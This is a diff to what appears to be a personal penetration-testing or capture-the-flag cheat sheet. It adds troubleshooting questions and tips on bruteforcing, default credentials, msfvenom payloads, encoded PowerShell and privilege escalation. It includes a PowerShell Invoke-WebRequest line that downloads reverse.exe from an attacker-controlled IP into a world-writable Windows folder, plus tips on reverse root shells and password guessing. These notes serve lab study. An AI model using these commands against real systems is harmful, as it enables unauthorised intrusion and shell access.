@@ -1,14 +1,21 @@
- - Symbols
-    - AA = After Access is gained
-    - * = 
-
-
 Things to think about when stuck:
-    "Is there anything I can just bruteforce?"
-    "What else is open for me to input?"
-    "Is the version exploitable? Are there known exploits to this technology?"
-    "If I need a specific file type (.asp, .html, etc) have a tried to make a payload with that file extension with msfvenom?"
-    "Is there a process that writes/executes as root? Can I somehow make it write/execute a reverse root shell?"
+    
+    Don't know what to do next:
+        "Is there anything I can just bruteforce?"
+        "Does this service have default credentials?"
+        "What else is open for me to input?"
+
+    Exploit Found but still stuck:
+        "If I found an exploit, or maybe even if I haven't, is there a place the service stores a database? Can I access that place?"
+        "If I need a specific file type (.asp, .html, etc) have a tried to make a payload with that file extension with msfvenom?"
+        "Can I base64 encode a powershell script with the -enc command and call it on the target computer?"
+        "Have I tried encoding the payload?"
+
+    No exploit, only information:
+        "Is the version exploitable? Are there known exploits to this technology?"
+
+    Access, but no root:
+        "Is there a process that writes/executes as root? Can I somehow make it write/execute a reverse root shell?"
 
 ---------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------
@@ -43,6 +50,8 @@ Enumeration:
         gobuster - For bruteforcing directories and files on a webserver
         dirbuster - For bruteforcing directories and files on a webserver
         hydra - For bruteforcing usernames and passwords on ssh, http, https, etc.
+
+        If you have a password that isn't working, but the password has a date/season/year in it, maybe try the current year?
 
     ---------------------------------------
 
@@ -125,6 +134,8 @@ Priviledge Escalation:
 
 Unix Helpers:
 
+    "sed -i -e 's/\r$//' scriptname.sh" - Windows will have these stupid fucking line endings in their text files, so you can do a "Stream Editor" call to fix the file -i inplace with an -e expression.
+
     tee - for piping input and output easily
 
     ifconfig - for seeing network information and ipaddress
@@ -134,6 +145,8 @@ Unix Helpers:
     curl (client URL) - Allow arbitrary sending of http requests
 
     cat - Show the contents of a file
+
+    THIS -> | - Using the pipe to force the next command to be executed can be useful when a windows server will only execute powershell scripts after a pipe.
 
     less - Show the contents of a file
 
@@ -183,6 +196,9 @@ Nmap commands:
 Windows Powershell (WTF)
 
     PrivEsc:
+
+        * If you are denied access to a folder, but have the path to a folder that comes through that restricted folder, trying to access the direct path might fucking work for some reason!*
+
         powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe - To do a Windows equivalent of a wget with powershell.
             - Make sure you are in a world-writable directory such as C://Windows/Temp/
         
